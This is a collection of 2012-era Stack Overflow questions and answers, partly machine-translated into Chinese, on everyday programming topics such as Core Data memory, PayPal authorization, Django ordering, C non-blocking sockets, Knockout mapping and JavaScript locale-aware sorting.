其原因已包含[在此问题](https://stackoverflow.com/questions/8738767/backgroundworker-cross-thread-operation-not-valid)中。但我更惊讶的是，这速度慢到你想让它异步。可能有一些简单的方法可以使此代码更具响应性 -`Control.SuspendLayout()`并且`.ResumeLayout()`浮现在脑海中。

# iphone - How to deal with Core Data retain cycles

> ID：12624478
> 
> 赞同：2
> 
> 时间：2012-09-27T15:06:34.627
> 
> 标签：iphone, ios, core-data, memory, automatic-ref-counting

The core data guidelines recommend that you model your relationships with an inverse. No problems there.

Interestingly though if you Load an object A that has a to many relationship to B and walk the object graph you end up with a retain cycle and the memory is never freed.

For a simple object graph you can just call refreshObject:mergeChanges: on A to re-fault the object so that relationships are no longer strong references.

If you have a complicated object graph though this is a pain because you need to call it on every object you have touched. It seems like a pretty important consideration when using core data yet there is only one paragraph on this topic in Apples documentation.

I am just wondering how other people handle this? A long running app would slowly just consume more and more memory without some sort of manual process to force objects to revert to faults.

Are there any known patterns for dealing with this. I'd imagine so since lots of people use Core Data I just can't find any recommendations

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T16:25:20.420

在做出断言时，您忽略了核心数据的几个方面。如果您获取一个对象，假设对象 A 与对象 B 具有一对多关系，当您获取 A 时，您将拥有 B 上与 A 相关的所有对象。一对多关系创建与 A 相关的对象列表，并将它们包含在 NSManagedObject 子类的 NSSet 属性中。请注意，这些对象处于故障状态，并且由此产生的内存占用是微不足道的。如果您操作关系中的对象，核心数据将在必要时对这些对象进行无故障处理。您无需执行任何操作即可获得此行为。如果您想自己触发故障行为以再次将对象发送到故障，您可以使用 refreshObject:mergeChanges:。如果你不把它们送回故障，

# paypal - Paypal付款流程分两步？

> ID：12624479
> 
> 赞同：1
> 
> 时间：2012-09-27T15:06:43.197
> 
> 标签：paypal, payment-gateway, paypal-ipn, paypal-sandbox

我想分两步进行付款，第一步贝宝应该从用户帐户中收取资金，而不是转移到商家帐户。

当我以该类型发送另一个带有成功操作的请求时，贝宝应将资金转移到商家帐户，或者如果我通过失败操作，则贝宝应退还给用户。

有什么办法吗？

我按照 URL 冷藏，但找不到解决方案。

[https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_WPECIntegration#id0861K0T0WY4](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_WPECIntegration#id0861K0T0WY4)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T02:54:02.520

Express Checkout 是您想要的，但有[更好的文档可用](https://www.x.com/developers/paypal/development-and-integration-guides#ec)。

基本上，您所追求的是授权和捕获。当您创建 Express Checkout API 请求时，您将 PAYMENTACTION 设置为 Authorization。然后，当您准备好处理付款时，您调用 DoCapture 并传入您从 Express Checkout 获得的交易 ID。

在处理 DoCapture 调用之前，不会处理任何资金。如果您最终不需要处理它，您可以简单地什么都不做，但这会根据他们的银行在默认时间段内将用户帐户的授权搁置。通常为 30 天。

此时调用 DoVoid 是一种更好的做法，这将取消授权并将这些资金立即释放回用户的帐户。

如果您想直接用信用卡做同样的事情，您可以使用[Payments Pro](https://www.x.com/developers/paypal/development-and-integration-guides#wpp)。该过程几乎相同，只是实际上涉及的调用更少。

如果您使用的是 PHP，我建议您查看我[的 PayPal 的 PHP 类库](http://www.angelleye.com/overview-of-php-class-library-for-paypal/)。它会让你的这一切变得非常简单，如果你愿意，我也可以提供 30 分钟的免费培训来帮助你开始。

# vb.net - Best Practice For Error Checking Controls On A Form

> ID：12624488
> 
> 赞同：0
> 
> 时间：2012-09-27T15:06:57.737
> 
> 标签：vb.net, visual-studio-2010, error-checking

So I have a form with a variety of different controls (combobox, textboxes, listboxes, etc).

My first thought is to create a If, Else, End If statement. Well while that would work, it could also get pretty long, depending on the amount of controls and combinations.

Validation could include if a listbox is filled, checkbox is checked, etc pertaining to WinForms.

Is there a better solution to check all possiblities than an If statement?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T21:39:18.260

在用户填写表单时进行错误检查可能是值得的。这可以通过 LostFocus 事件来实现。前任：

```
Private Sub btnTest_Leave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles yourbutton.LostFocus
    Dim txt = yourbutton.Text
            If txt = "yourtest" Then
            'do stuff
            EndIf
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:22:33.870

如上。这取决于您尝试执行的验证。您是否正在验证用户输入、数据类型长度范围等。您是否正在验证业务规则。某某值是否应该等于其他值。有各种各样的可能性。

# django - 如何在 Django ORM 中更改 PostgreSQL 的默认空排序行为

> ID：12624490
> 
> 赞同：7
> 
> 时间：2012-09-27T15:07:00.183
> 
> 标签：django, postgresql, orm

默认情况下，PostgreSQL 将 NULL 值视为最高值，因此将它们首先排序以用于降序查询，最后用于升序查询。

您可以通过指定“NULLS LAST”或“NULLS FIRST”在每次查询或创建索引时修改此行为。

如何在不使用原始查询的情况下将其与 Django ORM 结合使用？即当我添加到我的 query_set 中时`qs.order_by("-publish_start")`，如何指定空值的排序？或者，作为替代方案，在字段/索引声明时。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-27T23:32:09.750

我想出了一种方法，可以通过使用来适应任何一种方式工作的数据库引擎（null 作为最高或最低值）`extra`，使 null 检查成为布尔值，并且在对布尔值进行排序时`false < true`似乎是通用的：

```
qs = qs.extra(select={'null_start': "publish_start is null"},
              order_by=['null_start', '-publish_start']) 
```

# java - How to do a partial match of BinarySearch()

> ID：12624493
> 
> 赞同：3
> 
> 时间：2012-09-27T15:07:05.680
> 
> 标签：java, data-structures, binary-tree

Im looking at a way of doing a partial match using a binary search. Here is my code:

```
public void checkCardIndexForMatches(List<String> wordsToCheck) throws IOException {
    String[] cardIndexCache = cardIndexCreator.getCardIndexCache();

    for (String text: wordsToCheck){
        int i = Arrays.binarySearch(cardIndexCache, text.getText().toLowerCase().trim());

        if (i > 0){
            text.setCardIndexMatch(true);
        }
        //check if partial match
        //                  else if 
    }
} 
```

So its pretty simple stuff so far - there is basically an external file which gets fed in, each line in the file is stored as an array in the cardIndexCache. The problem comes when the user wants to be able to match a 'phrase' in the array (a phrase being more than one word e.g. Mohammed Ali). The words in the wordsToCheck parameter are only passed in as individual words. So the first word will be Mohammed but the binary search fails as it doesnt know what the second word is. I cant think of a simple way of getting the binary search to indicate that a word has the potential to be a match (first part matches, just append the next word and see if that matches).

Any ideas much appreciated!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-18T05:26:53.083

**这是我编写的一个 Trie 以及一个基本上可以找到最大公共前缀的搜索功能，相似性搜索是可能的，但成本很高..**

* * *

```
class TNode
{
    public MapList<Char,TNode> next;

    public TNode ()
    {
        next = new MapList<Char,TNode>();
    }
} 
```

* * *

```
class Trie
{
    TNode head;

    public Trie ()
    {
        head = new TNode();
    }

    public void insert (String t)
    {
        TNode cur = head;

        for (Char c : t.toCharArray())
        {
            if (!cur.next.containsKey(c))
            {
                cur.next.put(c,new TNode());
            }
            cur = cur.next.get(c);
        }
    }

    public boolean remove (String t)
    {
        Stack<Pair<Char,TNode>> path = new Stack<Pair<Char,TNode>>();
        TNode cur = head;
        Pair<Char,TNode> n = null;

        for (Char c : t.toCharArray())
        {
            if (!cur.next.containsKey(c))
            {
                return false;
            }
            path.push(c,cur);
            cur = cur.next.get(c);
        }

        while (path.size() > 0)
        {
            n = path.pop();
            if (n.getSecond().next.get(n.getFirst()).next.size() > 1)
            {
                break;
            }
            else
            {
                n.getSecond().next.remove(n.getFirst());
            }
        }
    }

    public boolean search (String t)
    {
        TNode cur = head;

        for (Char c : t.toCharArray())
        {
            if (!cur.next.containsKey(c))
            {
                return false;
            }
            cur = cur.next.get(c);
        }

        return true;
    }

    public String searchMaxPrefix (String t)
    {
        TNode cur = head;
        String match = "";

        for (Char c : t.toCharArray())
        {
            if (cur.next.containsKey(c))
            {
                match += c;
            }
            else
            {
                break;
            }
        }

        return match;
    }
} 
```

# string - Function to count the number of cells in a column that contain a string

> ID：12624496
> 
> 赞同：3
> 
> 时间：2012-09-27T15:07:15.110
> 
> 标签：string, google-sheets, count, google-sheets-formula

This seems so basic but I can't figure it out for the life of me.

My inclination is to

1.  Have an array that is a subset of the original column but only shows the cells containing "string"
2.  Then, I would put that array in a count function that will spit out the length of the array. Voila.

Side note: the cells are a decent length so I'm not looking for an exact match of that string but for it to be contained somewhere therein.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T22:03:11.350

我认为[COUNTIF](https://support.google.com/docs/bin/static.py?hl=en&topic=25273&page=table.cs&tab=1240293)函数足以完成这项任务。

```
=COUNTIF(A:A;"*string*") 
```

# c - 在 C 中使用非阻塞套接字连接

> ID：12624499
> 
> 赞同：6
> 
> 时间：2012-09-27T15:07:26.923
> 
> 标签：c, sockets

我正在将脚本中的套接字连接更改为非阻塞连接。在一个教程中，我发现了以下几行：

```
x=fcntl(s,F_GETFL,0);              // Get socket flags
fcntl(s,F_SETFL,x | O_NONBLOCK);   // Add non-blocking flag 
```

所以我在创建套接字之后和连接语句之前添加了它们。它不再阻塞:)，但它也没有连接。我没有收到任何错误，连接只是返回-1。如果我将这些行注释掉，它就会连接起来。

我还需要添加什么才能获得非阻塞连接？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T15:14:40.213

检查返回值[`connect(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/connect.2.html)- 你应该得到`-1`, 和`EINPROGRESS`in [`errno(3)`](http://www.kernel.org/doc/man-pages/online/pages/man3/errno.3.html)。然后将套接字文件描述符添加到轮询集，并使用[`select(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html)or等​​待它[`poll(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html)。

这样，您可以同时进行多个连接尝试（例如浏览器就是这样做的）并且能够有更严格的超时。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T15:09:37.753

[connect](http://linux.die.net/man/2/connect)可能会立即返回 EINPROGRESS 错误。阅读使用[select](http://linux.die.net/man/2/select)。

请注意，您可能希望在[TEMP_FAILURE_RETRY](http://www.gnu.org/software/libc/manual/html_node/Interrupted-Primitives.html)宏中包装对 select 的调用。

# asp.net-mvc - C#，MVC - 通过反映其他模型的属性的属性来构建模型（在运行时）并保存在数据库中

> ID：12624503
> 
> 赞同：2
> 
> 时间：2012-09-27T15:07:39.997
> 
> 标签：asp.net-mvc, reflection, entity-framework-4.1, automapper

我希望提供`Person`如下定义的`vCard`从我的系统中打印 a 的能力。为了向用户提供*隐私*选项，用户可以选择是否显示/隐藏某些属性。在最简单的形式中，我需要一个单独的表格来保存用户的选择。

我想知道是否可以`configurator table`使用反射来构建它。如下面的`Person`模型所示，我可以使用自定义属性装饰属性，然后使用这些属性，构造并持久化一个模型，该模型将为`bool`每个装饰属性提供一个`Person`属性。

```
public class Person
{
    public string UserName { get; set; }
    public string FirstName { get; set; }

    [DisplayOnVCard]
    public string LastName { get; set; }

    [DisplayOnVCard]
    public string Email { get; set; }

    [DisplayOnVCard]
    public string MobilePhone { get; set; }
} 
```

**`[DisplayOnVCard]`自定义属性在哪里。*

最后，我希望数据库中的一个表与此相对应：

```
public class VCardConfigurator
{
    public bool LastName { get; set; }
    public bool Email { get; set; }
    public bool MobilePhone { get; set; }
} 
```

* * *

这只是一个实际巨大实体的示例表示。这就是为什么我希望避免手动将 bool 字段映射到每个可选属性。

我相信这个问题域与社交网站上隐私设置的工作方式非常相似，是吗？

在我输入此内容时，我确实考虑过如果我要从其中一个属性中删除该属性的可能性，这可能会产生什么影响。需要一些思考！

自我延伸阅读：

*   [在运行时以编程方式将属性添加到 MVC 模型](https://stackoverflow.com/questions/9588590/programmatically-adding-properties-to-an-mvc-model-at-runtime)

* * *

**我很有可能会走上完全错误的道路！如果是这种情况，请指教！**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T16:11:35.153

# #1 更新

我不确定是否可以为实例添加或删除属性，因为属性处于类级别，但它们的属性值可以更改（因为它们是实例）。

# 我建议的解决方案

我不确定您在“我希望数据库中有一个与此相对应的表”中的意思，因为您不能在数据库中拥有一个只包含每个用户的非隐私属性列的表。

您将需要一个用于此映射的专用表（可以说是“PrivacyMappings”表），其中包含以下列：UserId、PropertyName、IsPrivate。

添加用户时，所有属性都将添加到此表中，并具有默认的隐私设置（例如，默认情况下所有属性都是非私有的）。您可以通过迭代它们来添加属性并按照您所说的插入它们。

您可以在实体框架中使用以下类：

```
public class PrivacyMapping
{
public int UserId {get;set;}
public string PropertyName {get;set;}
public bool IsPrivate {get;set;}
} 
```

添加用户时添加默认隐私设置：

```
// retrieve user model properties.

foreach (property in properties)
{
//iterrate over the user Properties.
context.PrivacyMapping.Add(new PrivacyMapping(user.userId, propertyName, isPrivate);
}

context.SaveChanges() 
```

现在您可以通过以下方式获取所有用户非私有属性

```
context.PrivacyMapping.Where(p=>p.UserId == user.id && !IsPrivate).Select(p=>p.PropertyName); 
```

现在，您可以以任何方式处理信息。

例如，您可以有一个 VCardItems 类，它在其 c'tor 中接收用户 ID/对象，并按名称存储允许属性的字典。

```
public class VCardItems{

private Dictionary<string, object> properties{get;set;}

public VCardItems(User user)
{
// initiate values..
}
        public object this[string name] {
            get 
            { 
                if (properties.ContainsKey(name))
                {
                    return properties[name];
                }

                // A private property.
                return null;

            }
            set 
            {
                properties[name] = value;
            }
        }
    } 
```

还有其他如何使用数据的选项，例如 ActionFilter 在这种情况下将私有属性设置为 null 或将非私有数据存储在 HttpContext.Items 字典中，但这完全取决于您。

*第一条消息*

在我们详细介绍之前，我想知道您希望如何使用这个类。

例如，如果一个视图（或任何处理它的东西），将要接收有一个运行时生成的类，你将如何处理它？

你怎么知道这个模型有什么属性？

# c - How to get data from an sqlite3 prepared statement with 'union all' clause

> ID：12624505
> 
> 赞同：0
> 
> 时间：2012-09-27T15:07:41.853
> 
> 标签：c, sqlite

I got three `SELECT` statements connected with `UNION ALL`. I set up the compound statement such that `sqlite3_prepare_v2()` would prepare the resulting rows for me. If I were to make use of the resulting data, could I use a `for()` loop?

```
int i;
for(i = 0; sqlite3_step(res) == SQLITE_ROW; i++) {
    if (i == 0) data1 = sqlite3_column_int(res,0);
    else if (i == 1) data2 = sqlite3_column_int(res,0);
    else data3 = sqlite3_column_int(res,0);
} 
```

Is this supposed to work? I've tried it but it gives me garbage data. Is there an alternative way to implement this?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T17:35:08.163

这行得通。垃圾数据完全来自其他地方。您可以使用它来缩短您键入的代码量，但请注意，您可以使用它的数量是有限制的。

附加信息：您可以使用每个`UNION`表的相同参数从不同的表中进行选择`WHERE`，假设您让用户输入两个数据参数，并且有四个表使用这些参数，仅通过一些附加值不同。假设我想获取该附加列的值。我会让用户输入与我想要的输出所属的表不同的东西。使用`SELECT`与 复合的语句`UNION`，可以比进行实际比较和冗长的迭代更容易地选择所需的输出。

# php - 将一行从一个表移动到另一个表（插入值列表与列列表不匹配）

> ID：12624511
> 
> 赞同：0
> 
> 时间：2012-09-27T15:07:59.110
> 
> 标签：php, mysql, pdo, laravel

我正在使用 Laravel PHP 框架的 Fluent 查询构建器将行从一个表移动到另一个表。正在使用 PDO。使用原始查询`DB::query()`时，出现错误：

**错误**

```
SQLSTATE[21S01]: Insert value list does not match column list: 
1136 Column count doesn't match value count at row 1

SQL: INSERT IGNORE into listings_archive VALUES (?, ?) 
```

**询问**

```
// Get rows from first table
$rows = DB::table('table_1')
        ->where('id', '>', '12345')
        ->get();

// Copy rows to second table
foreach($rows as $row) {
    $listing = get_object_vars($row);
    DB::query('INSERT IGNORE into table_2 VALUES (?, ?)', $row);
} 
```

**$row 的 var_dump**

```
array(39) {
    ["id"]=>
    string(7) "2511877"
    ["name"]=>
    string(2) "AB"
    ["color"]=>
    NULL
    ["type"]=>
    NULL
    ... 
```

是什么导致了错误，如何解决？我尝试使用`NULL`s 删除元素，但仍然得到相同的错误！

* * *

## 更新

这可能是数组被传递到`DB::query()`. 这些非常简单的示例给出了类似的错误：

```
$row = array('id', 123);
DB::query('INSERT IGNORE into table_2 VALUES (?, ?)', $row); 
```

和

```
$row = array('id' => 123);
DB::query('INSERT IGNORE into table_2 VALUES (?, ?)', $row); 
```

**错误**

```
SQLSTATE[21S01]: Insert value list does not match column list: 
1136 Column count doesn't match value count at row 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:14:51.977

那么列数与值的数量不匹配。如果您不指定哪些列，则默认为全部，因此您需要类似

```
Insert IGNORE into table_2(Column1,Column2) Values (?, ?) 
```

Column1, Column2，是 table_2 中您要将 Table_1 中的值放入的两列的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-05T11:20:34.577

有相同的错误消息，但我在 php 中使用了 mysqli

*   基本上如上所述，如果表的结构不同，你必须命名字段

通过一些修修补补解决：

```
$stmt = $con->prepare("INSERT INTO table2
                              (field1, field2, ..., )
                              SELECT
                              field1, field2, ..., 
                              FROM
                              table1 WHERE field = ? "); 
```

# java - Creating directory Structure in a UNC path with java

> ID：12624512
> 
> 赞同：1
> 
> 时间：2012-09-27T15:08:04.947
> 
> 标签：java, directory, timeout, samba, unc

I'm trying to Create a directory structure with java, in a remote UNC location. java is running in a linux machine and the windows network path is mapped with SAMBA server.

Issue is :

When creating the directories it creates the first directory : OK

Try to create the first sub directory inside the first directory : FAILS

Because it takes some time (nearly 2 seconds) to show up the first directory through samba. This could be due to the slowness of the network (but it's unavoidable )

If i execute the same code step by step (debugging) it works normally and create the directory structure.

Please help me. I need some mechanism which will wait java mkdir() function until the initially created directory get showed up in the UNC path.

# twitter-bootstrap - Twitter Bootstrap Dropcaps color change

> ID：12624513
> 
> 赞同：0
> 
> 时间：2012-09-27T15:08:05.830
> 
> 标签：twitter-bootstrap

This code renders the number 1 in red as a drop cap

```
 <p><span class="dropcap">1</span> <strong> First point </strong></p> 
```

Id like to make the drop cap number 1 green. How can I do that?

Thanks.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-15T21:59:49.503

我很惊讶这还没有得到答复，对于迟到的答复感到抱歉。

您可以使用自己的 CSS 覆盖任何 CSS 行为。在您自己的 css 文件中：

```
.dropcap {
   color: #006600; /* or whatever shade of green you want */
} 
```

如果您不想覆盖每个 dropcap 颜色，那么您可以执行以下操作：

```
.green {
   color: #660000; 
} 
```

然后将您的html修改为以下内容：

```
<p><span class="dropcap green">1</span> <strong> First point </strong></p> 
```

# r - 多个 for() 循环和 if() 语句

> ID：12624517
> 
> 赞同：0
> 
> 时间：2012-09-27T15:08:12.027
> 
> 标签：r, if-statement, for-loop

我需要两个 for 循环。像这样：

```
for (i in seq_along(dat1)[25:30]) 
    for(j in seq_along(dat1)[2:7]) {
        print(summary(r <- lm(dat1[,j] ~ dat1[,i]+Jan+Nov, data=dat1)))
} 
```

现在我想调节输出，我只得到对角线而不是所有可能的排列，所以第一个`i`和第一个`j`。我该怎么做呢？

我尝试了 if 语句但`if (i==j)`不起作用，我不知道如何正确指定它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:25:57.670

你可以试试`if ((i-23) == j)`。但是下面的命令可能更简单：

```
mapply(25:30, 2:7, function(i, j)
                             summary(lm(dat1[,j] ~ dat1[,i]+Jan+Nov, data=dat1))) 
```

这将避免您不感兴趣的排列。

# knockout.js - 使用 ko.mapping 淘汰更新模型

> ID：12624519
> 
> 赞同：1
> 
> 时间：2012-09-27T15:08:19.373
> 
> 标签：knockout.js, knockout-mapping-plugin

当我们第一次应用 ViewModel 时一切正常，但是如果我们在创建计算字段后重新应用映射，它们就会被删除。如果我们不更改密钥，这段代码显然可以工作

[http://jsbin.com/ojabaf/14/edit](http://jsbin.com/ojabaf/14/edit)

```
var modelJs = {test:{
  list: [{name: 'a', val: 5, list: [ {name:'b', val: 11}, {name: 'c', val: 13}  ]}]}
};

var mapping = { 
    'list': {
        key: function(data) { return ko.utils.unwrapObservable(data.name); }
    },
  'name': {
    key: function(data) { return ko.utils.unwrapObservable(data.name); }
  }
};

var model = ko.mapping.fromJS(modelJs, mapping);

ko.utils.arrayForEach(model.test.list(), function(item) {
  item.comp = ko.computed({read: function() { return this.val() * 2; }  , owner: item });
  ko.utils.arrayForEach(item.list(), function(item2) {
    item2.comp = ko.computed({read: function() { return this.val() * 3; }  , owner: item2 });  
  });
});

ko.applyBindings(model);

$('button').click(function () {
  var modelJs = {test: {val: 3, list: [{name: 'b', val: 7, list: [ {name:'s', val: 15}, {name: 'c', val: 17} , {name: 'd', val: 17}, {name: 'f', val: 17}]}]}};
  ko.mapping.fromJS(modelJs, model);
}); 
```

有没有办法用 ko.mapping 重新计算那些计算字段，而不刷新页面？

我也尝试过使用模板... [http://jsbin.com/ojabaf/15/edit](http://jsbin.com/ojabaf/15/edit)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T16:18:15.967

与其循环遍历数组并将计算的 observables 添加到每个项目，不如`comp`设置映射，以便在创建项目时添加它们。

```
var mapping = {
  'list': {
    key: function (data) {
      return ko.utils.unwrapObservable(data.name);
    },
    create: function (options) {
      var mapped = ko.mapping.fromJS(options.data, {
        'list': {
          key: function (data) {
            return ko.utils.unwrapObservable(data.name);
          },
          create: function (options) {
            var mapped = ko.mapping.fromJS(options.data);
            return ko.utils.extend(mapped, {
              comp: ko.computed(function () {
                return this.val() * 3;
              }, mapped)
            });
          }
        }
      });
      return ko.utils.extend(mapped, {
        comp: ko.computed(function () {
          return this.val() * 2;
        }, mapped)
      });
    }
  },
  'name': {
    key: function (data) {
      return ko.utils.unwrapObservable(data.name);
    }
  }
};
var model = ko.mapping.fromJS(modelJs, mapping); 
```

[http://jsbin.com/asomiq/1/edit](http://jsbin.com/asomiq/1/edit)

# git - SVN history is lost in git

> ID：12624520
> 
> 赞同：6
> 
> 时间：2012-09-27T15:08:19.823
> 
> 标签：git, svn, move, revision-history

We moved a project from svn to git recently. Before moving to git, some folders were re-organized in svn.

Now, git doesnt show the complete history for files in the folders that were moved/re-named in svn.

Any ideas how we can get git to show the complete history ? (--follow didnt help)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T14:21:25.453

请注意，`git`它*不*以任何形式存储历史记录，它仅以当前名称存储文件的内容。它可以（尝试）通过寻找相似的内容来重建历史，仅此而已。我可能会补充说，它通常做得很好。

这是开发人员的良心决定：如果您收到通过邮件发送的补丁，它们不会携带历史记录。并且将历史记录保存在本地需要使用工具（编辑器`cp`、`mv`...）来真正捕捉正在发生的事情。这不值得。

# iphone - Asynchronous NSURLConnection and NSOperation - cancelling

> ID：12624528
> 
> 赞同：5
> 
> 时间：2012-09-27T15:08:35.257
> 
> 标签：iphone, ios, xcode, cocoa-touch, ipad

I want to cancel all requests. Here is how I'm creating asynchronous connection:

```
[NSURLConnection sendAsynchronousRequest:echo queue:self.queue completionHandler:^(NSURLResponse *respone, NSData *data, NSError *error){ 
```

I then use this method:

```
-(void)cancelAllRequests
{
    NSLog(@"%@",self.queue.operations);
    [self.queue cancelAllOperations];
    [self.queue waitUntilAllOperationsAreFinished];
} 
```

to cancel all requests.

Which actually doesn't do anything except changing a BOOL to YES.

So how I'm supposed to cancel an asynchronous connection?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:20:07.957

您*无法*取消使用 安排的连接`sendAsynchronousRequest`。您所指的队列仅用于调度完成处理程序。

如果您想完全控制 ，则`NSURLConnection`必须`NSURLConnectionDelegate`自己实现。示例实现可以在[https://gist.github.com/3794804上找到](https://gist.github.com/3794804)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:24:55.477

What you could do is put Synchronous requests into an Operation (using a block).

The set the NSOperationQueue maxNumberOfConcurrentOperations to 1 (so they run one at a time).

Then if you run cancelAllOperations on the queue it will stop any operations that haven't run yet.

# web-services - Purpose of ref parameter to web service

> ID：12624531
> 
> 赞同：1
> 
> 时间：2012-09-27T15:08:44.537
> 
> 标签：web-services, ref

Okay, I've got some sample code that I'm supposed to be going through to use an example for how to use a product...and I've got this code:

```
protected void checkout_Click(object sender, EventArgs e)
{
    OurWebServiceClient client = new OurWebServiceClient();
    this.session = client.BindAccount(ref this.session);
    client.FinalizeSession(this.session);
    client.Close();
    this.checkout.Text = "success";
    this.checkout.Enabled = false;
} 
```

So this code is a bit strange to me for various reasons, but the line that stands out to me is the second line in the method:

```
this.session = client.BindAccount(ref this.session); 
```

It's a ref, so this.session could actually point to a different object after the call. Except then they assign this.session to the value returned from the call, blowing away (as far as I can tell) anything they gained by having it as a ref. And what does it mean to have a ref variable passed into a web service anyway?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-22T12:57:34.807

该 Web 服务返回的任何内容都将分配给`this.session`. ref 的使用丢失了，因为`this.session`它被分配回了返回值。

通过将参数作为 ref 传递给 Web 服务，您可以获得任何其他方法调用所期望的功能，即您对该参数的更改会被反映回来。但是 IMO 这不是编写 Web 服务的好习惯。这很令人困惑。

# javascript - Javascript 中基于区域设置的排序，以预定义的方式对重音字母和其他变体进行排序

> ID：12624532
> 
> 赞同：17
> 
> 时间：2012-09-27T15:08:47.203
> 
> 标签：javascript, arrays, algorithm, sorting, locale

在芬兰语中，我们排序`W`后`V`（如英语），但因为`W`不是芬兰本土字母，所以它被视为 的变体`V`，按等于 排序`V`，但在两个词之间的唯一区别是 的情况`V`下`W`，然后`V`-version 首先排序。一个例子说明了正确的顺序：

```
Vatanen, Watanen, Virtanen 
```

在芬兰语中`V`，and`W`被整理为`A`and `Á`。`Á`排序为`A`，但在唯一不同的情况下，无重音的优先。相同的规则适用于所有其他重音字母，但`Å`,`Ä`和`Ö`在 Z 之后单独整理。

***问题：以预定义的方式对此类变体*进行排序的最佳算法是什么？**（例如`[Watanen, Vatanen, Virtanen]`到`[Vatanen, Watanen, Virtanen]`）？

另外：这个问题与扩展以涵盖[http://cldr.unicode.org/index/cldr-spec/collat​​ion](http://cldr.unicode.org/index/cldr-spec/collation-guidelines) -guidelines 中定义的其他变体有关，因为该技术很可能是同样，这个问题的答案有利于尽可能广泛的受众，并且可以使排序算法与 Unicode CLDR 中定义的排序规则兼容。Unicode CLDR 定义了字母之间的三个级别的差异：一级（基本字母）、二级（重音字母）和三级（字符大小写）。

我曾想过某种*数组准备*，比如在数字排序中，我们可以用零填充所有数字，使它们与字符串一样。一个例子： Array`[file1000.jpg, file3.jpg, file22.jpg]`可以通过以下方式填充零来*准备*使其与字符串可比：`[file1000.jpg, file0003.jpg, file0022.jpg]`. 由于数组的*准备*，我们可以使用原生 Array.sort() 快速排序。

目标语言是 Javascript，它不支持基于排序的排序，所以自定义排序功能必须自己制作。该算法是首选，但如果您也有代码，则值得 +1。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2015-04-25T13:17:49.753

自从您最初提出这个问题以来，JavaScript 终于获​​得了一些不错的语言环境支持，包括排序规则。

阅读新的[EcmaScript 6 / Harmony](https://en.wikipedia.org/wiki/ECMAScript#ECMAScript_Harmony_.286th_Edition.29)功能[`Intl`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl#toc)，特别是[`Intl.Collator`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Collator).

该文档实际上并没有很清楚地表明芬兰语支持现代和传统的排序顺序，但我已经尝试过并且它们是。

要获得传统订单的整理者，您需要传递一个“花哨的”语言代码字符串：`fi-u-co-trad`. 对于“改革后”的排序顺序，有`fi-u-co-reformed`. 这分解为：

*   `fi`- 芬兰语的 ISO 639 语言代码。
*   `u`- 启用 Unicode 功能/选项。（没有很好的记录）
*   `co`- 整理选项。
*   `trad`- 传统的排序顺序。我阅读了有关西班牙语的此选项，但通过测试发现它也适用于芬兰语。（没有很好的记录）
*   `reformed`- 改革排序顺序。似乎是“传统”的反义词。如果您既不指定也不`trad`指定，这可能在某些浏览器和其他浏览器上。`reformed``default``trad``reformed`

编码：

```
var surnames = ['Watanen', 'Vatanen', 'Virtanen'];

var traColl = new Intl.Collator('fi-u-co-trad');
var refColl = new Intl.Collator('fi-u-co-reformed');
var defColl = new Intl.Collator('fi');

console.log('traditional:', traColl.resolved.requestedLocale + ' -> ' + traColl.resolved.collation, surnames.sort(function (a, b) {
  return traColl.compare(a,b);
}));

console.log('reformed:', refColl.resolved.requestedLocale + ' -> ' + refColl.resolved.collation, surnames.sort(function (a, b) {
  return refColl.compare(a,b);
}));

console.log('default:', defColl.resolved.requestedLocale + ' -> ' + defColl.resolved.collation, surnames.sort(function (a, b) {
  return defColl.compare(a,b);
})); 
```

输出：

> 传统的：fi-u-co-trad -> trad ["Vatanen", "Watanen", "Virtanen"]
> 改革的：fi-u-co-reformed -> 改革的 ["Vatanen", "Virtanen", "Watanen"]
> 默认值：fi -> 默认值 [“Vatanen”、“Virtanen”、“Watanen”]

在 Google Chrome 中进行了测试，根据我在网上阅读的内容，它在这方面落后于 Firefox。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2017-03-21T12:57:19.857

我今天遇到了这个问题并遇到了[`String.prototype.localeCompare`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/localeCompare)。你可以使用它`arr.sort()`并指定一个语言环境：

```
var names = ['Andrea', 'Ándrea', 'Àndrea', 'Äiti', 'Özmir', 'åke', 'Zorro', 'Åke'];

// Undesired order:
names.sort()
console.log('default sort', names);

// Desired order:
names.sort((nameA, nameB) => nameA.localeCompare(nameB, 'fi') > 0);
console.log('locale sort', names);

// Or since positive values are truthy, you can omit the `> 0`:
names.sort((nameA, nameB) => nameA.localeCompare(nameB, 'fi'));

// You can also control whether upper or lower case should sort first:
